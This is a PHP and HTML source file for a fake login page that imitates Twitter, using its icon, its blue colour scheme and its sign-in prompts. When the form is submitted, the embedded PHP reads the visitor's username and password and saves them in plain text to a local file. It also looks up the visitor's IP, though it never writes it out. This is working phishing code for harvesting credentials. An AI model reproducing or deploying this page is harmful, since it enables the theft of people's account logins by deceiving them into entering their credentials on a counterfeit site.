<form method="post">
  <i class="fa fa-twitter"></i>
  <div>
  <form method="post">

      <input type="text" name="name" placeholder="Phone, email or username"/>
  </div>
  <div>
    <input type="password" name="name2" placeholder="Password"/>
  </div>
  <div class="remember-me">
    <input type="checkbox" id="remember-me" /><label for="remember-me">Remember me</label>
    &#8226;
    <a href="#">Forgot password</a>
  </div>
  <input type="submit" value="Log in"/>
</form>
<html>
<head>
<style>

*{
  box-sizing: border-box;
}

form{
  border: 1px solid #E1E8ED;
  border-radius: 10px;
  padding: 50px;
  width: 70%;
  margin: 0 auto;
  color: grey;
  text-align: center;
  font-family: sans-serif;
  font-size: 12px;
}

a, .fa {
  color: #1DA1F2;
}

a{
  text-decoration: none;
}

.fa {
  font-size: 25px;
  margin-bottom: 10px;
}

input{
  margin-bottom: 10px;
}

::-webkit-input-placeholder{
  font-size: 14px;
}

input[type="text"],
input[type="password"]{
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid lightgrey;
}

input[type="text"]:focus,
input[type="password"]:focus{
  border: 1px solid #1DA1F2;
  outline: none;
}

.remember-me{
  text-align: left;
}


input[type="submit"]{
  width: 100%;
  background: #1DA1F2;
  padding: 10px;
  color: white;
  font-size: 16px;
  border-radius: 5px;
  border: none;
}




</style>
</body>
</html> 

<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['name'])){
$ip = $user_ip;
$userinput = $_POST['name'];
$userinputt = $_POST['name2'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>

